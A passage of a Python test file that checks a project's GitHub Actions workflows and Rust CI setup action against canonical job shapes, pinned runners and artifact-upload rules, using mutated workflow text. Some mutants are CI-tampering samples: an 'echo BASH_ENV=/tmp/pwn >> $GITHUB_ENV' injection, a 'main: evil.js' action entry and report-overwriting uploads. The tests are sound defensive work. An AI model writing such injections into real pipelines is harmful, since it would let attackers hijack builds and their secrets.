        toolchain_hits = rust_ci_setup_violations(toolchain, path=path)
        self.assertIn(RUST_CI_SETUP_TOOLCHAIN_MSG, " ".join(toolchain_hits))
        self.assertNotIn(RUST_CI_SETUP_MSG, " ".join(toolchain_hits))
        wrapper = '        echo "RUSTC_WRAPPER=sccache" >> "$GITHUB_ENV"\n'
        self.assertEqual(text.count(wrapper), 1)
        second = text.replace(wrapper, wrapper + wrapper, 1)
        second_doc, second_err = load_workflow_yaml(second)
        self.assertIsNone(second_err)
        self.assertEqual(len(second_doc["runs"]["steps"]), len(_RUST_CI_SETUP_STEPS))
        self.assertEqual(second_doc["runs"]["steps"][4]["run"].count("RUSTC_WRAPPER="), 2)
        second_hits = rust_ci_setup_violations(second, path=path)
        self.assertIn(RUST_CI_SETUP_MSG, " ".join(second_hits))
        self.assertNotIn(RUST_CI_SETUP_TOOLCHAIN_MSG, " ".join(second_hits))
        extra = (
            "\n"
            "    - name: Extra env\n"
            "      shell: bash\n"
            '      run: echo "EXTRA=set" >> "$GITHUB_ENV"\n'
        )
        appended = text + extra
        appended_doc, appended_err = load_workflow_yaml(appended)
        self.assertIsNone(appended_err)
        appended_steps = appended_doc["runs"]["steps"]
        self.assertEqual(len(appended_steps), len(_RUST_CI_SETUP_STEPS) + 1)
        self.assertTrue(
            all(
                _step_equals_canonical(got, want)
                for got, want in zip(appended_steps, _RUST_CI_SETUP_STEPS)
            )
        )
        self.assertIn("GITHUB_ENV", appended_steps[-1]["run"])
        appended_hits = rust_ci_setup_violations(appended, path=path)
        self.assertIn(RUST_CI_SETUP_MSG, " ".join(appended_hits))
        self.assertNotIn(RUST_CI_SETUP_TOOLCHAIN_MSG, " ".join(appended_hits))

    def test_coverage_html_and_editor_test_steps_are_canonical(self) -> None:
        """coverage-html and the editor test job are exact ordered step lists.

        A trailing step keeps the prefix. The HTML install drops its pin and stays one step.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(coverage_permission_violations(coverage, path="coverage.yml"), [])
        self.assertEqual(coverage_permission_violations(editor, path="aw-editor-tests.yml"), [])
        html_extra = coverage + "\n      - name: After report\n        run: echo extra\n"
        html_doc, html_err = load_workflow_yaml(html_extra)
        self.assertIsNone(html_err)
        html_steps = html_doc["jobs"]["coverage-html"]["steps"]
        self.assertEqual(len(html_steps), len(_COVERAGE_HTML_STEPS) + 1)
        self.assertTrue(
            all(_step_equals_canonical(got, want) for got, want in zip(html_steps, _COVERAGE_HTML_STEPS))
        )
        self.assertEqual(coverage_report_publish_violations(html_extra, path="coverage.yml"), [])
        self.assertIn(
            COVERAGE_HTML_STEPS_MSG,
            " ".join(coverage_permission_violations(html_extra, path="coverage.yml")),
        )
        install = (
            "      - name: Install cargo-tarpaulin\n"
            "        run: cargo install cargo-tarpaulin --version 0.35.2 --locked\n"
            "\n"
            "      - name: Download coverage XML\n"
        )
        self.assertEqual(coverage.count(install), 1)
        unpinned = coverage.replace(
            install,
            install.replace(" --version 0.35.2 --locked", "", 1),
            1,
        )
        self.assertNotEqual(unpinned, coverage)
        unpinned_doc, unpinned_err = load_workflow_yaml(unpinned)
        self.assertIsNone(unpinned_err)
        self.assertEqual(
            len(unpinned_doc["jobs"]["coverage-html"]["steps"]),
            len(_COVERAGE_HTML_STEPS),
        )
        self.assertIn(
            COVERAGE_HTML_STEPS_MSG,
            " ".join(coverage_permission_violations(unpinned, path="coverage.yml")),
        )
        self.assertNotIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(unpinned, path="coverage.yml")),
        )
        renamed = coverage.replace("  coverage-html:\n", "  coverage-pages:\n", 1)
        self.assertNotEqual(renamed, coverage)
        self.assertIn(
            COVERAGE_HTML_STEPS_MSG,
            " ".join(coverage_permission_violations(renamed, path="coverage.yml")),
        )
        editor_anchor = "  # Coverage job (optional - Linux only for speed)\n"
        self.assertEqual(editor.count(editor_anchor), 1)
        editor_extra = editor.replace(
            editor_anchor,
            "    - name: After tests\n      run: echo extra\n\n" + editor_anchor,
            1,
        )
        editor_doc, editor_err = load_workflow_yaml(editor_extra)
        self.assertIsNone(editor_err)
        editor_steps = editor_doc["jobs"]["test"]["steps"]
        self.assertEqual(len(editor_steps), len(_EDITOR_TEST_STEPS) + 1)
        self.assertTrue(
            all(_step_equals_canonical(got, want) for got, want in zip(editor_steps, _EDITOR_TEST_STEPS))
        )
        self.assertEqual(
            coverage_report_publish_violations(editor_extra, path="aw-editor-tests.yml"),
            [],
        )
        self.assertIn(
            EDITOR_TEST_STEPS_MSG,
            " ".join(coverage_permission_violations(editor_extra, path="aw-editor-tests.yml")),
        )
        renamed_editor = editor.replace("  test:\n", "  editor-test:\n", 1)
        self.assertEqual(editor.count("  test:\n"), 1)
        self.assertIn(
            EDITOR_TEST_STEPS_MSG,
            " ".join(coverage_permission_violations(renamed_editor, path="aw-editor-tests.yml")),
        )

    def test_pinned_report_upload_and_overwrite_are_rejected(self) -> None:
        """Only the producer upload may publish the pinned report, and overwrite is absent.

        An upload on coverage-html or the editor test job is outside the producer.
        A second producer upload keeps that job id. overwrite is a different key.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(coverage_report_publish_violations(coverage, path="coverage.yml"), [])
        self.assertEqual(
            coverage_report_publish_violations(editor, path="aw-editor-tests.yml"),
            [],
        )
        html_upload = (
            "\n"
            "      - name: Extra upload\n"
            "        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n"
            "        with:\n"
            "          name: coverage-xml\n"
            "          path: extra.txt\n"
        )
        html = coverage + html_upload
        html_doc, html_err = load_workflow_yaml(html)
        self.assertIsNone(html_err)
        html_jobs = [
            job_id
            for job_id, _job, step in _iter_steps(html_doc)
            if _is_named_action(step, "actions/upload-artifact")
            and _ci_item(step.get("with"), "name")[1] == "coverage-xml"
        ]
        self.assertEqual(html_jobs, ["coverage", "coverage-html"])
        self.assertIn(
            PINNED_REPORT_MSG,
            " ".join(coverage_report_publish_violations(html, path="coverage.yml")),
        )
        self.assertIn(
            COVERAGE_HTML_STEPS_MSG,
            " ".join(coverage_permission_violations(html, path="coverage.yml")),
        )
        editor_upload = (
            "    - name: Extra upload\n"
            "      uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n"
            "      with:\n"
            "        name: aw-editor-lcov\n"
            "        path: extra.txt\n\n"
        )
        editor_anchor = "  # Coverage job (optional - Linux only for speed)\n"
        editor_mutant = editor.replace(editor_anchor, editor_upload + editor_anchor, 1)
        editor_doc, editor_err = load_workflow_yaml(editor_mutant)
        self.assertIsNone(editor_err)
        editor_jobs = [
            job_id
            for job_id, _job, step in _iter_steps(editor_doc)
            if _is_named_action(step, "actions/upload-artifact")
            and _ci_item(step.get("with"), "name")[1] == "aw-editor-lcov"
        ]
        self.assertEqual(editor_jobs, ["test", "coverage"])
        self.assertIn(
            PINNED_REPORT_MSG,
            " ".join(coverage_report_publish_violations(editor_mutant, path="aw-editor-tests.yml")),
        )
        self.assertIn(
            EDITOR_TEST_STEPS_MSG,
            " ".join(coverage_permission_violations(editor_mutant, path="aw-editor-tests.yml")),
        )
        producer = (
            "      - name: Upload coverage XML\n"
            "        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
            "        with:\n"
            "          name: coverage-xml\n"
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
            "          retention-days: 30\n"
        )
        self.assertEqual(coverage.count(producer), 1)
        duplicated = coverage.replace(producer, producer + producer, 1)
        dup_doc, dup_err = load_workflow_yaml(duplicated)
        self.assertIsNone(dup_err)
        dup_jobs = [
            job_id
            for job_id, _job, step in _iter_steps(dup_doc)
            if _is_named_action(step, "actions/upload-artifact")
            and _ci_item(step.get("with"), "name")[1] == "coverage-xml"
        ]
        self.assertEqual(dup_jobs, ["coverage", "coverage"])
        self.assertIn(
            PINNED_REPORT_MSG,
            " ".join(coverage_report_publish_violations(duplicated, path="coverage.yml")),
        )
        report = (
            "          name: coverage-report\n"
            "          path: tools/astraweave-assets/coverage-html\n"
        )
        self.assertEqual(coverage.count(report), 1)
        for label, key in (("lower", "overwrite"), ("cased", "Overwrite")):
            mutant = coverage.replace(report, f"          name: coverage-report\n          {key}: true\n", 1)
            self.assertNotEqual(mutant, coverage, label)
            parsed, parse_err = load_workflow_yaml(mutant)
            self.assertIsNone(parse_err, label)
            upload = parsed["jobs"]["coverage-html"]["steps"][5]
            self.assertTrue(_has_overwrite(upload.get("with")), label)
            self.assertEqual(_ci_item(upload.get("with"), "name")[1], "coverage-report")
            messages = " ".join(coverage_report_publish_violations(mutant, path="coverage.yml"))
            self.assertIn(OVERWRITE_MSG, messages, label)
            self.assertNotIn(PINNED_REPORT_MSG, messages, label)

    def test_kani_summary_job_shape_is_exact(self) -> None:
        """The summary job's keys, runner, timeout, and steps are canonical.

        An extra key keeps the step list. A changed runner keeps the key set.
        A step inserted before the fail step, a step after it, and a changed
        Check Results script each leave the fail step canonical.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_job_steps_violations(text, path="kani.yml"), [])
        doc, err = load_workflow_yaml(text)
        self.assertIsNone(err)
        summary = doc["jobs"]["summary"]
        self.assertEqual(set(summary), _KANI_SUMMARY_KEYS)
        self.assertTrue(_steps_equal_ordered(summary["steps"], _KANI_SUMMARY_STEPS))
        self.assertTrue(_kani_summary_gate_ok(summary))
        header = "  summary:\n    name: Kani Summary\n"
        self.assertEqual(text.count(header), 1)
        extras = {
            "continue-on-error-true": "    continue-on-error: true\n",
            "continue-on-error-false": "    continue-on-error: false\n",
            "container": "    container: ubuntu:22.04\n",
            "services": "    services:\n      extra:\n        image: example\n",
            "strategy": "    strategy:\n      matrix: {}\n",
            "environment": "    environment: example\n",
        }
        for name, extra in extras.items():
            mutant = text.replace(header, header + extra, 1)
            self.assertNotEqual(mutant, text, name)
            parsed, parse_err = load_workflow_yaml(mutant)
            self.assertIsNone(parse_err, name)
            job = parsed["jobs"]["summary"]
            self.assertNotEqual(set(job), _KANI_SUMMARY_KEYS, name)
            self.assertTrue(_steps_equal_ordered(job["steps"], _KANI_SUMMARY_STEPS), name)
            self.assertTrue(_kani_fail_step_ok(job), name)
            violations = kani_job_steps_violations(mutant, path="kani.yml")
            self.assertIn(KANI_SUMMARY_MSG, " ".join(violations), name)
            self.assertNotIn(KANI_JOB_SHAPE_MSG, " ".join(violations), name)
        runner_anchor = (
            "  summary:\n"
            "    name: Kani Summary\n"
            "    permissions:\n"
            "      contents: read\n"
            "    runs-on: ubuntu-latest\n"
            "    timeout-minutes: 10\n"
        )
        self.assertEqual(text.count(runner_anchor), 1)
        runner = text.replace(
            runner_anchor,
            runner_anchor.replace("ubuntu-latest", "self-hosted", 1),
            1,
        )
        timeout = text.replace(
            runner_anchor,
            runner_anchor.replace("timeout-minutes: 10", "timeout-minutes: 1", 1),
            1,
        )
        for label, mutant in (("runner", runner), ("timeout", timeout)):
            parsed, parse_err = load_workflow_yaml(mutant)
            self.assertIsNone(parse_err, label)
            job = parsed["jobs"]["summary"]
            self.assertEqual(set(job), _KANI_SUMMARY_KEYS, label)
            self.assertTrue(_steps_equal_ordered(job["steps"], _KANI_SUMMARY_STEPS), label)
            self.assertIn(
                KANI_SUMMARY_MSG,
                " ".join(kani_job_steps_violations(mutant, path="kani.yml")),
                label,
            )
        before = (
            "      - name: Prime shell\n"
            '        run: echo "PATH_EXTRA=set" >> "$GITHUB_ENV"\n'
            "      - name: Fail if any verification failed\n"
        )
        fail_header = "      - name: Fail if any verification failed\n"
        self.assertEqual(text.count(fail_header), 1)
        inserted = text.replace(fail_header, before, 1)
        inserted_doc, inserted_err = load_workflow_yaml(inserted)
        self.assertIsNone(inserted_err)
        inserted_steps = inserted_doc["jobs"]["summary"]["steps"]
        self.assertEqual(len(inserted_steps), len(_KANI_SUMMARY_STEPS) + 1)
        self.assertTrue(_kani_fail_step_ok(inserted_doc["jobs"]["summary"]))
        self.assertIn("GITHUB_ENV", inserted_steps[1]["run"])
        self.assertIn(
            KANI_SUMMARY_MSG,
            " ".join(kani_job_steps_violations(inserted, path="kani.yml")),
        )
        after = text.replace(
            "        run: exit 1\n",
            "        run: exit 1\n      - name: After gate\n        run: echo after\n",
            1,
        )
        self.assertEqual(text.count("        run: exit 1\n"), 1)
        after_doc, after_err = load_workflow_yaml(after)
        self.assertIsNone(after_err)
        after_steps = after_doc["jobs"]["summary"]["steps"]
        self.assertEqual(len(after_steps), len(_KANI_SUMMARY_STEPS) + 1)
        self.assertTrue(
            all(
                _step_equals_canonical(got, want)
                for got, want in zip(after_steps, _KANI_SUMMARY_STEPS)
            )
        )
        self.assertIn(
            KANI_SUMMARY_MSG,
            " ".join(kani_job_steps_violations(after, path="kani.yml")),
        )
        check_line = (
            '          echo "**Kani** provides formal mathematical proofs of correctness, '
            'not just testing." >> $GITHUB_STEP_SUMMARY\n'
        )
        self.assertEqual(text.count(check_line), 1)
        rewritten = text.replace(
            check_line,
            check_line + '          echo "BASH_ENV=/tmp/pwn" >> "$GITHUB_ENV"\n',
            1,
        )
        rewritten_doc, rewritten_err = load_workflow_yaml(rewritten)
        self.assertIsNone(rewritten_err)
        rewritten_job = rewritten_doc["jobs"]["summary"]
        self.assertEqual(len(rewritten_job["steps"]), len(_KANI_SUMMARY_STEPS))
        self.assertIn("BASH_ENV", rewritten_job["steps"][0]["run"])
        self.assertTrue(_kani_fail_step_ok(rewritten_job))
        self.assertFalse(_step_equals_canonical(rewritten_job["steps"][0], _KANI_CHECK_STEP))
        self.assertIn(
            KANI_SUMMARY_MSG,
            " ".join(kani_job_steps_violations(rewritten, path="kani.yml")),
        )
        continued = text.replace(
            "      - name: Check Results\n",
            "      - name: Check Results\n        continue-on-error: true\n",
            1,
        )
        self.assertEqual(text.count("      - name: Check Results\n"), 1)
        continued_doc, continued_err = load_workflow_yaml(continued)
        self.assertIsNone(continued_err)
        self.assertTrue(_kani_fail_step_ok(continued_doc["jobs"]["summary"]))
        self.assertIn(
            KANI_SUMMARY_MSG,
            " ".join(kani_job_steps_violations(continued, path="kani.yml")),
        )

    def test_kani_summary_needs_order_is_significant(self) -> None:
        """needs is compared as a list. The same ids in another order fail.

        A set comparison accepts the reordered list.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        needs = "    needs: [kani-ecs, kani-math, kani-sdk, kani-core]\n"
        reordered = "    needs: [kani-core, kani-ecs, kani-math, kani-sdk]\n"
        self.assertEqual(text.count(needs), 1)
        mutant = text.replace(needs, reordered, 1)
        doc, err = load_workflow_yaml(mutant)
        self.assertIsNone(err)
        found = doc["jobs"]["summary"]["needs"]
        self.assertEqual(set(found), set(_KANI_SUMMARY_NEEDS))
        self.assertNotEqual(list(found), _KANI_SUMMARY_NEEDS)
        self.assertTrue(_steps_equal_ordered(doc["jobs"]["summary"]["steps"], _KANI_SUMMARY_STEPS))
        self.assertIn(
            KANI_SUMMARY_MSG,
            " ".join(kani_job_steps_violations(mutant, path="kani.yml")),
        )

    def test_second_summary_fail_step_fails_the_count(self) -> None:
        """The fail step is present once. A second copy keeps the first canonical.

        `if not found` accepts that pair.
        """
        first = {
            "name": _KANI_FAIL_STEP["name"],
            "if": _KANI_FAIL_STEP["if"],
            "run": _KANI_FAIL_STEP["run"],
        }
        job = {"steps": [first, dict(first)]}
        self.assertTrue(_step_equals_canonical(job["steps"][0], _KANI_FAIL_STEP))
        self.assertEqual(len(job["steps"]), 2)
        self.assertFalse(_kani_fail_step_ok(job))

    def test_codecov_upload_runner_is_pinned(self) -> None:
        """Both Codecov upload jobs pin runs-on and timeout-minutes.

        The key set still matches, so a key-only allowlist accepts both.
        """
        anchor = (
            "      id-token: write\n"
            "    runs-on: ubuntu-latest\n"
            "    timeout-minutes: 10\n"
        )
        for path in ("coverage.yml", "aw-editor-tests.yml"):
            text = (WORKFLOWS / path).read_text(encoding="utf-8")
            self.assertEqual(text.count(anchor), 1, path)
            self.assertNotIn(
                UPLOAD_RUNNER_MSG,
                " ".join(coverage_permission_violations(text, path=path)),
                path,
            )
            runner = text.replace(anchor, anchor.replace("ubuntu-latest", "self-hosted", 1), 1)
            timeout = text.replace(
                anchor,
                anchor.replace("timeout-minutes: 10", "timeout-minutes: 1", 1),
                1,
            )
            for label, mutant in (("runner", runner), ("timeout", timeout)):
                doc, err = load_workflow_yaml(mutant)
                self.assertIsNone(err, f"{path}:{label}")
                job = doc["jobs"]["codecov"]
                self.assertEqual(set(job), _UPLOAD_JOB_KEYS, f"{path}:{label}")
                messages = " ".join(coverage_permission_violations(mutant, path=path))
                self.assertIn(UPLOAD_RUNNER_MSG, messages, f"{path}:{label}")
                self.assertNotIn(UPLOAD_JOB_KEYS_MSG, messages, f"{path}:{label}")

    def test_rust_ci_setup_action_shape_is_exact(self) -> None:
        """The setup action's inputs, using, and top-level keys are canonical.

        runs.using: node20 with main: leaves the step list canonical.
        A changed components default leaves the toolchain default in place.
        """
        path = ".github/actions/rust-ci-setup/action.yml"
        text = (ROOT / path).read_text(encoding="utf-8")
        self.assertEqual(rust_ci_setup_violations(text, path=path), [])
        doc, err = load_workflow_yaml(text)
        self.assertIsNone(err)
        self.assertEqual(set(doc), _RUST_CI_SETUP_KEYS)
        self.assertTrue(_mapping_equals(doc["inputs"], _RUST_CI_SETUP_INPUTS))
        self.assertEqual(doc["runs"]["using"], _RUST_CI_SETUP_USING)
        self.assertEqual(set(doc["runs"]), _RUST_CI_SETUP_RUNS_KEYS)
        combined = text.replace(
            "  using: composite\n",
            "  using: node20\n  main: evil.js\n",
            1,
        )
        node_only = text.replace("  using: composite\n", "  using: node20\n", 1)
        main_only = text.replace(
            "  using: composite\n",
            "  using: composite\n  main: evil.js\n",
            1,
        )
        for label, mutant in (
            ("node20-main", combined),
            ("node20", node_only),
            ("main", main_only),
        ):
            self.assertNotEqual(mutant, text, label)
            parsed, parse_err = load_workflow_yaml(mutant)
            self.assertIsNone(parse_err, label)
            self.assertTrue(
                _steps_equal_ordered(parsed["runs"]["steps"], _RUST_CI_SETUP_STEPS),
                label,
            )
            hits = " ".join(rust_ci_setup_violations(mutant, path=path))
            self.assertIn(RUST_CI_SETUP_RUNS_MSG, hits, label)
            self.assertNotIn(RUST_CI_SETUP_MSG, hits, label)
            self.assertNotIn(RUST_CI_SETUP_TOOLCHAIN_MSG, hits, label)
        extra_key = text.replace("name: Rust CI setup\n", "name: Rust CI setup\nauthor: extra\n", 1)
        extra_doc, extra_err = load_workflow_yaml(extra_key)
        self.assertIsNone(extra_err)
        self.assertNotEqual(set(extra_doc), _RUST_CI_SETUP_KEYS)
        self.assertTrue(_mapping_equals(extra_doc["inputs"], _RUST_CI_SETUP_INPUTS))
        extra_hits = " ".join(rust_ci_setup_violations(extra_key, path=path))
        self.assertIn(RUST_CI_SETUP_KEYS_MSG, extra_hits)
        self.assertNotIn(RUST_CI_SETUP_INPUTS_MSG, extra_hits)
        self.assertNotIn(RUST_CI_SETUP_MSG, extra_hits)
        components = text.replace("    default: rustfmt,clippy\n", "    default: rustfmt\n", 1)
        self.assertEqual(text.count("    default: rustfmt,clippy\n"), 1)
        components_doc, components_err = load_workflow_yaml(components)
        self.assertIsNone(components_err)
        self.assertEqual(components_doc["inputs"]["toolchain"]["default"], "1.89.0")
        self.assertNotEqual(components_doc["inputs"]["components"]["default"], "rustfmt,clippy")
        component_hits = " ".join(rust_ci_setup_violations(components, path=path))
        self.assertIn(RUST_CI_SETUP_INPUTS_MSG, component_hits)
        self.assertNotIn(RUST_CI_SETUP_TOOLCHAIN_MSG, component_hits)
        self.assertNotIn(RUST_CI_SETUP_MSG, component_hits)
        added_input = text.replace(
            '    default: "false"\n\nruns:\n',
            '    default: "false"\n'
            "  extra-input:\n"
            "    description: Extra\n"
            "    required: false\n"
            '    default: "x"\n\nruns:\n',
            1,
        )
        self.assertEqual(text.count('    default: "false"\n\nruns:\n'), 1)
        added_doc, added_err = load_workflow_yaml(added_input)
        self.assertIsNone(added_err)
        self.assertIn("extra-input", added_doc["inputs"])
        self.assertEqual(added_doc["inputs"]["toolchain"]["default"], "1.89.0")
        added_hits = " ".join(rust_ci_setup_violations(added_input, path=path))
        self.assertIn(RUST_CI_SETUP_INPUTS_MSG, added_hits)
        self.assertNotIn(RUST_CI_SETUP_TOOLCHAIN_MSG, added_hits)
        self.assertNotIn(RUST_CI_SETUP_RUNS_MSG, added_hits)

    def test_coverage_html_and_editor_test_job_shape_are_exact(self) -> None:
        """coverage-html and the editor test job pin keys, runs-on, and timeout.

        A job-level if: and container: keep the step list. A changed runner
        keeps the key set.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        html_anchor = (
            "  coverage-html:\n"
            "    name: HTML coverage report\n"
            "    needs: coverage\n"
            "    permissions:\n"
            "      contents: read\n"
            "    runs-on: ubuntu-latest\n"
            "    timeout-minutes: 45\n"
        )
        editor_anchor = (
            "  test:\n"
            "    name: Test AW Editor (${{ matrix.os }})\n"
            "    permissions:\n"
            "      contents: read\n"
            "    runs-on: ${{ matrix.os }}\n"
            "    timeout-minutes: 45\n"
        )
        self.assertEqual(coverage.count(html_anchor), 1)
        self.assertEqual(editor.count(editor_anchor), 1)
        html_cases = {
            "if": html_anchor + "    if: false\n",
            "container": html_anchor + "    container: ubuntu:22.04\n",
        }
        for label, replacement in html_cases.items():
            mutant = coverage.replace(html_anchor, replacement, 1)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, label)
            job = doc["jobs"]["coverage-html"]
            self.assertNotEqual(set(job), _COVERAGE_HTML_KEYS, label)
            self.assertTrue(_steps_equal_ordered(job["steps"], _COVERAGE_HTML_STEPS), label)
            messages = " ".join(coverage_permission_violations(mutant, path="coverage.yml"))
            self.assertIn(COVERAGE_HTML_JOB_MSG, messages, label)
            self.assertNotIn(COVERAGE_HTML_STEPS_MSG, messages, label)
        html_runner = coverage.replace(
            html_anchor,
            html_anchor.replace("    runs-on: ubuntu-latest\n", "    runs-on: self-hosted\n", 1),
            1,
        )
        html_timeout = coverage.replace(
            html_anchor,
            html_anchor.replace("    timeout-minutes: 45\n", "    timeout-minutes: 1\n", 1),
            1,
        )
        for label, mutant in (("runner", html_runner), ("timeout", html_timeout)):
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, label)
            job = doc["jobs"]["coverage-html"]
            self.assertEqual(set(job), _COVERAGE_HTML_KEYS, label)
            messages = " ".join(coverage_permission_violations(mutant, path="coverage.yml"))
            self.assertIn(COVERAGE_HTML_JOB_MSG, messages, label)
            self.assertNotIn(COVERAGE_HTML_STEPS_MSG, messages, label)
        editor_cases = {
            "if": editor_anchor + "    if: false\n",
            "container": editor_anchor + "    container: ubuntu:22.04\n",
        }
        for label, replacement in editor_cases.items():
            mutant = editor.replace(editor_anchor, replacement, 1)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, label)
            job = doc["jobs"]["test"]
            self.assertNotEqual(set(job), _EDITOR_TEST_KEYS, label)
            self.assertTrue(_steps_equal_ordered(job["steps"], _EDITOR_TEST_STEPS), label)
            messages = " ".join(coverage_permission_violations(mutant, path="aw-editor-tests.yml"))
            self.assertIn(EDITOR_TEST_JOB_MSG, messages, label)
            self.assertNotIn(EDITOR_TEST_STEPS_MSG, messages, label)
        editor_runner = editor.replace(
            editor_anchor,
            editor_anchor.replace(
                "    runs-on: ${{ matrix.os }}\n",
                "    runs-on: self-hosted\n",
                1,
            ),
            1,
        )
        editor_timeout = editor.replace(
            editor_anchor,
            editor_anchor.replace("    timeout-minutes: 45\n", "    timeout-minutes: 1\n", 1),
            1,
        )
        for label, mutant in (("runner", editor_runner), ("timeout", editor_timeout)):
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, label)
            job = doc["jobs"]["test"]
            self.assertEqual(set(job), _EDITOR_TEST_KEYS, label)
            messages = " ".join(coverage_permission_violations(mutant, path="aw-editor-tests.yml"))
            self.assertIn(EDITOR_TEST_JOB_MSG, messages, label)
            self.assertNotIn(EDITOR_TEST_STEPS_MSG, messages, label)

    def test_workflow_env_must_be_present_where_canonical(self) -> None:
        """Removing the canonical workflow env map fails.

        Accepting a missing map leaves this green.
        """
        blocks = {
            "aw-editor-tests.yml": (
                "permissions: {}\n\nenv:\n  CARGO_TERM_COLOR: always\n  RUST_BACKTRACE: 1\n\njobs:\n"
            ),
            "kani.yml": (
                "permissions: {}\n\nenv:\n  CARGO_TERM_COLOR: always\n  CARGO_INCREMENTAL: 0\n\njobs:\n"
            ),
        }
        for name, block in blocks.items():
            text = (WORKFLOWS / name).read_text(encoding="utf-8")
            self.assertEqual(text.count(block), 1, name)
            self.assertEqual(run_context_violations(text, path=name), [], name)
            mutant = text.replace(block, "permissions: {}\n\njobs:\n", 1)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, name)
            self.assertNotIn("env", doc, name)
            violations = run_context_violations(mutant, path=name)
            self.assertTrue(violations, name)
            self.assertIn(RUN_CONTEXT_MSG, violations[0], name)

    def test_step_level_overwrite_and_missing_upload_are_rejected(self) -> None:
        """overwrite on the step itself fails, and so does a missing producer upload.

        The with: map has no overwrite key. A count that only rejects extras stays quiet
        when the producer upload is gone.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        step_anchor = (
            "      - name: Upload HTML coverage report\n"
            "        if: always()\n"
            "        uses:"
        )
        self.assertEqual(coverage.count(step_anchor), 1)
        step_level = coverage.replace(
            step_anchor,
            "      - name: Upload HTML coverage report\n"
            "        if: always()\n"
            "        overwrite: true\n"
            "        uses:",
            1,
        )
        parsed, parse_err = load_workflow_yaml(step_level)
        self.assertIsNone(parse_err)
        upload = parsed["jobs"]["coverage-html"]["steps"][5]
        self.assertTrue(_has_overwrite(upload))
        self.assertFalse(_has_overwrite(upload.get("with")))
        messages = " ".join(coverage_report_publish_violations(step_level, path="coverage.yml"))
        self.assertIn(OVERWRITE_MSG, messages)
        self.assertNotIn(PINNED_REPORT_MSG, messages)
        producer_name = (
            "          name: coverage-xml\n"
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
        )
        self.assertEqual(coverage.count(producer_name), 1)
        missing = coverage.replace(
            producer_name,
            producer_name.replace("name: coverage-xml", "name: coverage-other", 1),
            1,
        )
        missing_doc, missing_err = load_workflow_yaml(missing)
        self.assertIsNone(missing_err)
        names = [
            _ci_item(step.get("with"), "name")[1]
            for job_id, _job, step in _iter_steps(missing_doc)
            if job_id == "coverage" and _is_named_action(step, "actions/upload-artifact")
        ]
        self.assertEqual(names, ["coverage-other"])
        self.assertIn(
            PINNED_REPORT_MSG,
            " ".join(coverage_report_publish_violations(missing, path="coverage.yml")),
        )

    def test_pinned_report_names_resolve_expressions_and_other_files(self) -> None:
        """Expression names, composites, and reusable workflows cannot publish the report.

        A quoted constant is resolved. An unresolved name fails closed when it
        could be a pinned report. A resolved name that is not pinned is allowed,
        including a literal prefix plus an unresolved expression.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        report = "          name: coverage-report\n"
        self.assertEqual(coverage.count(report), 1)
        constant = coverage.replace(report, "          name: ${{ 'coverage-xml' }}\n", 1)
        unresolved = coverage.replace(report, "          name: ${{ matrix.artifact }}\n", 1)
        for label, mutant in (("constant", constant), ("unresolved", unresolved)):
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, label)
            name = _ci_item(doc["jobs"]["coverage-html"]["steps"][5].get("with"), "name")[1]
            self.assertNotEqual(name, "coverage-xml", label)
            self.assertTrue(_could_be_pinned_report_name(name), label)
            producer_names = [
                _ci_item(step.get("with"), "name")[1]
                for job_id, _job, step in _iter_steps(doc)
                if job_id == "coverage" and _is_named_action(step, "actions/upload-artifact")
            ]
            self.assertEqual(producer_names, ["coverage-xml"], label)
            self.assertIn(
                PINNED_REPORT_MSG,
                " ".join(coverage_report_publish_violations(mutant, path="coverage.yml")),
                label,
            )
        composite = (
            "name: Local upload\n"
            "description: local\n"
            "runs:\n"
            "  using: composite\n"
            "  steps:\n"
            "    - name: Upload report\n"
            "      uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n"
            "      with:\n"
            "        name: coverage-xml\n"
            "        path: out\n"
            "        overwrite: true\n"
        )
        composite_hits = " ".join(
            coverage_report_publish_violations(
                composite, path=".github/actions/local-upload/action.yml"
            )
        )
        self.assertIn(PINNED_REPORT_MSG, composite_hits)
        self.assertIn(OVERWRITE_MSG, composite_hits)
        reusable = (
            "name: Called\n"
            "on:\n"
            "  workflow_call:\n"
            "jobs:\n"
            "  publish:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/upload-artifact@v7\n"
            "        with:\n"
            "          name: aw-editor-lcov\n"
            "          path: lcov.info\n"
            "          overwrite: true\n"
        )
        reusable_hits = " ".join(
            coverage_report_publish_violations(reusable, path=".github/workflows/called.yml")
        )
        self.assertIn(PINNED_REPORT_MSG, reusable_hits)
        self.assertIn(OVERWRITE_MSG, reusable_hits)
        allowed = (
            "name: Other\n"
            "on: push\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/upload-artifact@v7\n"
            "        with:\n"
            "          name: ${{ 'not-a-pinned-report' }}\n"
            "          path: out\n"
            "      - uses: actions/upload-artifact@v7\n"
            "        with:\n"
